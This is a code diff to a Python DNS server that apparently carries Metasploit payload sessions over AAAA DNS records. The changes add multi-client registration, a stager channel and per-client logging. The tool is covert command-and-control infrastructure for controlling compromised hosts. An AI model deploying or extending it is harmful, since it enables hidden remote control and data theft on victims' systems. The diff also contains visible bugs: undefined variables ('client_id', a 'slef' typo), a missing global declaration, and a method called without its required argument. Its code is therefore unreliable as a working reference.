@@ -168,6 +168,10 @@ class IPv6Encoder():
     @staticmethod
     def encode_ready_receive():
         return ["ffff:0000:0000:0000:0000:0000:0000:0000"]
+    
+    @staticmethod 
+    def encode_registration(client_id, status):
+        return ["ffff:"+hex(ord(client_id))[2:4]+hex(status)[2:4]+":0000:0000:0000:0000:0000:0000"]
 
     @staticmethod
     def encode_finish_send():
@@ -181,33 +185,51 @@ class IPv6Encoder():
 servers = []
 _clients = {}
 dns_server = None
-
+last_client = '`'
 
 def get_client_by_id(client_id):
     if client_id in _clients:
         return _clients[client_id]
 
 
-def register_client(client_id, client):
-    if client_id in _clients:
-        logger.warning("Clients exists alredy. Rewriting it.")
-    _clients[client_id] = client
+def register_client(client, clid = None):
+
+    if clid:
+        last_client = clid
+    else:
+        last_client = chr(ord(last_client)+1)
+    
+    if client_id == '{':
+        logger.error("Clients limit reached.")
+        return None
+    
+    _clients[last_client] = client
+        
+    return last_client
 
 
 class Client(object):
+    STAGER = -1
+    PRE_REGISTRATION = 0
     INITIAL = 1
     INCOMING_DATA = 2
 
 
-    def __init__(self, name):
-        register_client(name, self)
-        self.state = self.INITIAL
+    def __init__(self, clid = None):
+        self.client_id = register_client(self, clid)
+        
+        if not clid:
+            self.state = self.STAGER
+            self.sub_domain = "7812"
+        else:
+            self.state = self.PRE_REGISTRATION
+            self.sub_domain = "aaaa"
+            
         self.received_data_size = 0
         self.logger = logging.getLogger(self.__class__.__name__)
         #self.logger.setLevel(logging.DEBUG)
         self.received_data = ""
         self.last_received_index = -1
-        self.sub_domain = "aaaa"
         self.send_data = ""
         self.enc_send_data = []
         self.send_indexes = set()
@@ -231,46 +253,56 @@ class Client(object):
 
     def set_server(self, server):
         self.server = server
-
+    
+    def new_client(self):
+        if self.state == self.PRE_REGISTRATION:
+            self.logger.info("NEW client: %s, status: %d", self.client_id, self.state)
+            return IPv6Encoder.encode_registration(self.client_id, self.state)
+    
+    def new_client_confirmed(self, client_id):
+        self.state = self.INITIAL
+        self.logger.info("Confirmation for client: %s, status: %d", self.client_id, self.state)
+        return IPv6Encoder.encode_registration(self.client_id, self.state)
+    
     def incoming_data_header(self, data_size, padding):
         if self.received_data_size == data_size and self.state == self.INCOMING_DATA:
             self.logger.info("Duplicated header request: waiting %d bytes of data with padding %d", data_size, padding)
             return IPv6Encoder.encode_ready_receive()
         elif self.state == self.INCOMING_DATA:
-            self.logger.error("Bad request. Client in the receiving data state")
+            self.logger.error("Bad request. Client (%s) in the receiving data state", self.client_id)
             return None
-        self.logger.info("Data header: waiting %d bytes of data", data_size)
+        self.logger.info("Data header: waiting %d bytes of data (client %s)", data_size, self.client_id)
         self._setup_receive(data_size, padding)
         return IPv6Encoder.encode_ready_receive()
 
     def incoming_data(self, data, index, counter):
         self.logger.debug("Data %s, index %d", data, index)
         if self.state != self.INCOMING_DATA:
-            self.logger.error("Bad state(%d) for this action. Send finish.", self.state)
+            self.logger.error("Bad state(%d) for this action. Send finish. (client %s)", self.state, self.client_id)
             return IPv6Encoder.encode_finish_send()
 
         data_size = len(data)
 
         if data_size == 0:
-            self.logger.error("Empty incoming data. Send finish.")
+            self.logger.error("Empty incoming data. Send finish. (client %s)", self.client_id)
             return IPv6Encoder.encode_finish_send()
 
         if self.last_received_index >= index:
-            self.logger.info("Duplicated packet.")
+            self.logger.info("Duplicated packet. (client %s)", self.client_id)
             return IPv6Encoder.encode_send_more_data()
 
         if len(self.received_data) + data_size > self.received_data_size:
-            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
+            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data. (client %s)", self.client_id)
             self._initial_state()
             return IPv6Encoder.encode_finish_send()
 
         self.received_data += data
         self.last_received_index = index
         if len(self.received_data) == self.received_data_size:
-            self.logger.info("All expected data is received")
+            self.logger.info("All expected data is received (client %s)", self.client_id)
             try:
                 packet = base64.b32decode(self.received_data + "=" * self.padding, True)
-                self.logger.info("Put decoded data to the server queue")
+                self.logger.info("Put decoded data to the server queue (client %s)", self.client_id)
                 self.server_queue.put(packet)
                 self._initial_state()
                 if self.server:
@@ -288,29 +320,31 @@ class Client(object):
             if data_size == 0 and (len(self.enc_send_data) == 0 or len(self.send_indexes) == len(self.enc_send_data)):
                 data = None
                 try:
-                    self.logger.info("Checking client queue...")
+                    self.logger.info("Checking client (%s) queue...", self.client_id)
                     data = self.client_queue.get_nowait()
                     self.logger.debug("New data size is %d", len(data))
                 except Queue.Empty:
                     pass
                 if data is not None:
-                    self.logger.info("There are new data for sending to client")
+                    self.logger.info("There are new data for sending to client %s", self.client_id)
                     self.send_data = data
+                    self.enc_send_data = ""
             data_size = len(self.send_data)
             if data_size != 0:
                 next_sub = IPv6Encoder.get_next_sdomain(self.sub_domain)
                 sub_domain = next_sub
-                self.enc_send_data = IPv6Encoder.encode_data(self.send_data)
+                if not self.enc_send_data:
+                    self.enc_send_data = IPv6Encoder.encode_data(self.send_data)
                 self.send_indexes = set()
                 #self.send_data = ""
             else:
-                self.logger.info("No data for client.")
+                self.logger.info("No data for client %s.", slef.client_id)
             self.logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
             return IPv6Encoder.encode_senddata_header(sub_domain, data_size)
         else:
             self.logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
             if sub_domain == "aaaa":
-                self.logger.info("MIGRATE. Not DONE")
+                self.logger.info("MIGRATE DONE")
                 self.sub_domain = sub_domain
                 self.send_data = ""
                 self.enc_send_data = ""
@@ -364,8 +398,13 @@ class Request(object):
         m = cls.match(qname)
         if not m:
             return None
-        client_id = m.group("client")
-        client = get_client_by_id(client_id)
+            
+        if qname[:7] == "dcg7812":
+            client = Client()
+        else:
+            client_id = m.group("client")
+            client = get_client_by_id(client_id)
+            
         if client is not None:
             Request.LOGGER.info("Request will be handled by class %s", cls.__name__)
             return cls._handle_client(client, m)
@@ -379,16 +418,24 @@ class Request(object):
 
 
 class GetDataHeader(Request):
-    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(g|000g)\.(?P<rnd>\d+)\.(?P<client>\w)")
+    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.g\.(?P<rnd>\d+)\.(?P<client>[a-z])")
 
     @classmethod
     def _handle_client(cls, client, match_data):
         sub_domain = match_data.group('sub_dom')
         return client.request_data_header(sub_domain)
 
+class GetStageHeader(Request):
+    EXPR = re.compile(r"7812\.000g\.(?P<rnd>\d+)\.")
+
+    @classmethod
+    def _handle_client(cls, client, match_data):
+        sub_domain = '7812'
+        return client.request_data_header(sub_domain)
+
 
 class GetDataRequest(Request):
-    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>\w)")
+    EXPR = re.compile(r"(?P<sub_dom>\w{4})\.(?P<index>\d+)\.(?P<rnd>\d+)\.(?P<client>[a-z])")
 
     @classmethod
     def _handle_client(cls, client, match_data):
@@ -396,9 +443,17 @@ class GetDataRequest(Request):
         index = int(match_data.group('index'))
         return client.request_data(sub_domain, index)
 
+class GetStageRequest(Request):
+    EXPR = re.compile(r"7812\.(?P<index>\d+)\.(?P<rnd>\d+)\.")
+
+    @classmethod
+    def _handle_client(cls, client, match_data):
+        sub_domain = '7812'
+        index = int(match_data.group('index'))
+        return client.request_data(sub_domain, index)
 
 class IncomingDataRequest(Request):
-    EXPR = re.compile(r"t\.(?P<base64>.*)\.(?P<idx>\d+)\.(?P<cnt>\d+)\.(?P<client>\w)")
+    EXPR = re.compile(r"t\.(?P<base64>.*)\.(?P<idx>\d+)\.(?P<cnt>\d+)\.(?P<client>[a-z])")
 
     @classmethod
     def _handle_client(cls, client, match_data):
@@ -412,7 +467,7 @@ class IncomingDataRequest(Request):
 
 
 class IncomingDataHeaderRequest(Request):
-    EXPR = re.compile(r"(?P<size>\d+)\.(?P<padd>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>\w)")
+    EXPR = re.compile(r"(?P<size>\d+)\.(?P<padd>\d+)\.tx\.(?P<rnd>\d+)\.(?P<client>[a-z])")
 
     @classmethod
     def _handle_client(cls, client, match_data):
@@ -420,6 +475,19 @@ class IncomingDataHeaderRequest(Request):
         padding = int(match_data.group('padd'))
         return client.incoming_data_header(size, padding)
 
+class IncomingNewClient(Request):
+    EXPR = re.compile(r"7812\.reg0\.\d+\.")
+
+    @classmethod
+    def _handle_client(cls, client, match_data):
+        return client.new_client()
+        
+class IncomingConfirmingClient(Request):
+    EXPR = re.compile(r"7812\.reg1\.\d+\.(?P<client>[a-z])\.")
+
+    @classmethod
+    def _handle_client(cls, client, match_data):
+        return client.new_client_confirmed()
 
 class AAAARequestHandler(object):
     def __init__(self, domain):
@@ -427,6 +495,7 @@ class AAAARequestHandler(object):
         self.logger = logging.getLogger(self.__class__.__name__)
         #self.logger.setLevel(logging.DEBUG)
         self.request_handler = [
+            IncomingNewClient,
             IncomingDataHeaderRequest,
             IncomingDataRequest,
             GetDataRequest,
@@ -543,7 +612,7 @@ class MSFClient(object):
 
     LOGGER = logging.getLogger("MSFClient")
 
-    def __init__(self, sock, server, stageles):
+    def __init__(self, sock, server, stageles, client_id):
         self.sock = sock
         self.stageles =  stageles
         self.ssl_socket = None
@@ -551,7 +620,11 @@ class MSFClient(object):
         self.need_read_size = 0
         self.state = MSFClient.INITIAL
         self.server = server
-        self.client_id = 'a' # TODO
+        
+        if not self.stageles:
+            self.client_id = '0'
+        else:
+            self.client_id = client_id
         client = get_client_by_id(self.client_id)
         client.set_server(self)
         
@@ -745,7 +818,13 @@ class Server(object):
                 if s is self.listen_socket:
                     connection, address = s.accept()
                     self.logger.info("Incoming connection from address %s", address)
-                    self.clients.append(MSFClient(connection, self, self.stageles))
+                    
+                    if not self.stageles:
+                        self.clients.append(MSFClient(connection, self, self.stageles, '0'))
+                        self.stageles = True
+                    else:
+                        self.clients.append(MSFClient(connection, self, self.stageles, client_id))
+                    
                 elif s is self.poll_pipe[0]:
                     self.logger.info("Polling")
                     s.read(1)
@@ -809,7 +888,9 @@ def main():
     
     payload_type = True if args.type.find('single')>=0 else False
     logger.info("Stageless mode: %s", payload_type)
-    client = Client('a') # TODO: multiclient support?
+    
+    if not payload_type:
+        client = Client('0')
     
     dns_server = DnsServer(args.domain, args.ipaddr, ns_records)
     server = Server('0.0.0.0', args.lport, payload_type)
@@ -817,8 +898,8 @@ def main():
     
     logger.info("Starting nameserver...")
 
-    servers.append(SocketServer.ThreadingUDPServer(('', args.dport), UDPRequestHandler))
-    servers.append(SocketServer.ThreadingTCPServer(('', args.dport), TCPRequestHandler))
+    servers.append(SocketServer.UDPServer(('', args.dport), UDPRequestHandler))
+    servers.append(SocketServer.TCPServer(('', args.dport), TCPRequestHandler))
 
     for s in servers:
         thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
